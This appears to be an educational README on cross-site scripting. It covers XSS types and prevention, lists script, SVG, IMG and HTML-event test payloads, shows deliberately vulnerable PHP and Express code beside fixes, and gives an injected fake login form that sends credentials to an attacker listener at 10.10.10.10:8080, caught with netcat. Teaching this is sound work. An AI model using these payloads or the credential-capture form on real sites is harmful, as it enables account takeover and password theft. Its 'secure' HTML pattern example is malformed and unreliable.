# XSS---Basics
Basic overview of XSS

What is XSS (Cross Site Scripting)

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data. 

Types of XSS

- Reflected XSS         // Where the malicious script comes from the current HTTP request.
- Stored XSS            // Where the malicious script comes from the website's database.
- DOM-based XSS         // Where the vulnerability exists in client-side code rather than server-side code.

What can XSS abused for:


- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

Top XSS prevention controls:

- Filter and sanitize all user input and input boxes (Disallow specific characters etc..) - Use OWASP XSS Evasion sheet for proactive controls
- Enforce Client-Side Validation - HTML (Pattern) / JavaScript (Yup / Validator.js / regex)
- Enforce secure coding (SAST / DAST / RASP / IAST)
- Implement CSP (Content Secuirty Policy) - CSP controls where scripts can be sourced from (Only add authorized domains / partners)
- Implement WAF (Configured according to threat-centric controls)
- Implement RASP - Monitors code instructions in real-time 



Testing if webiste input boxes / search boxes are vulnerable to XSS

```
Basic Payloads 

<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

SVG Payloads

<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)

IMG Payloads

<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

HTML Payloads

<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>

Common abused tags for XSS

<script>
<body>
<img>
<iframe>
<input>
<link>
<table>
<div>
<object>
<src>
```

Unsecure PHP Vulnerable Code Example 1

```
<center><h1><font color="red">PHP XSS Test</font></h1>
<hr>
<form method="post">
  <textarea name="text" placeholder="Place Text"></textarea></br>
  <input type="submit" name="bouton" value="Enter" />
</form>

<?php
if(isset($_POST["bouton"])){
  $text = $_POST["text"];
  echo "<strong>Data:</strong>  ".$text;
}


 ?>
</center>

```
Unsecure PHP XSS Code Example 2

The below code snippet is vulnerable to XSS becuase the "name" paramater receives user-supplied input that is not being validated before it gets passed to HTML for output
```

<?php

if (!isset($_GET['name'])) 

{
  echo "<h1>Hi! What's your name?</h1>";
  echo "<form action='' method='GET'>";
  echo "<input type='text' name='name'>";
  echo "</form>";

} else {
  header("X-XSS-Protection: 0");
  
  $name = $_GET['name'];  // No user input sanitization
  echo "<h1>Hi $name!</h1>";
}

```


Secure PHP XSS Code Example

Below we added the htmlspecialchars() function infront of the "name" paramater to convert special characters such as <>'"& to HTML entities

This allows HTML to output the user-supplied input as text instead of executing any script tags such as <script>--Malicious_String</script>

We also enforce the HTML Pattern attribute to add regular expression validation by disallowing specific characters such as <>|&'"
```
<?php

if (!isset($_GET['name']))  // Accept user input 
{

  echo "<h1>Hi. What is your name?</h1>";
  echo "<form action='' method='GET'>";   // Create text box to accept user input from a GET request
  echo "<input type='text' name='name'> pattern=[^<>|&'"\x22]+";     //HTML validation - Disallowing the following characters: <>|&'"
  echo "</form>";



} else {
  $name = htmlspecialchars($_GET['name']); // Function to sanatize HTML user input saved to the "name" paramater - Outputs user input as text
  echo "<h1>Hi $name!";
}


```

Basic PHP XSS HTML Injection Example

Below code snippet can be used to perform a HTML injection attack to redirect the user to a custom login page. When the user submits his/her credentials , a request will be sent to the attacker's listener to capture the credentials in cear-text

```
h3>Please login to proceed</h3> <form action=http://10.10.10.10:8080>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

// Inject the above command inside a vulnerable input field / box

Attacker: nc -lvnp 8080 // To capture credentials

```

JavaScript Vulnerable Code Example 

```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => res.send('Hello World!'))


app.listen(port, () => console.log(`App listening on port ${port}!`))


const Vulnerability = (req, res) => {
    var user = req.params.user;
    var respond = `
        <h1>Hi, ${user}</h1>   // The Vulnerability
    `
    res.send(respond);
}


const Vulnerability2 = (req, res) => {
    var {user} = req.params;
    var respond = `
        <script> var x = "${user}" </script>   // The vulnerability
    `
    res.send(respond);
}


app.get('/vuln', Vulnerability);
app.get('/vuln2', Vulnerability2);

```
JavaScript Secure Code Example

```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => res.send('Hello World!'))

app.get('/noVuln1', NoVulnerability1);
app.get('/noVuln2', NoVulnerability2);

app.listen(port, () => console.log(`Example app listening on port ${port}!`))


const NoVulnerability1 = (req, res) => {
    var user = db.getCurrentUser();
    res.json({
        name: user.name,
        email: user.email
    });
}

const NoVulnerability2 = (req, res) => {
    var accept = req.params.accept ? true : false;
    if(accept){
        res.send('Thank you for accepting');
    }else{
        res.send('Why you did not accept it');
    }
}

```
JavaScript Code Example - Preventing specific characters 

In the below code , we escape certian characters and convert them to HTML entities so that it gets parsed as text instead of actual code 
```
String.prototype.escape = function() {
    var tagsToReplace = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;'
    };
    return this.replace(/[&<>]/g, function(tag) {
        return tagsToReplace[tag] || tag;
    });
};
```

General Tips to Avoid XSS in Web Applications:

- Implement CSP (Content Security Policy)
- Use HTTPOnly Cookie Flag
- Consider Using an Auto-Escaping Template System such as AngularJS Strict Contextual Escaping
- Use Modern up to date JS frameworks 
- Utilize JavaScript libraries such as Yup & validator.js to help secure your code by validating user-suplied data


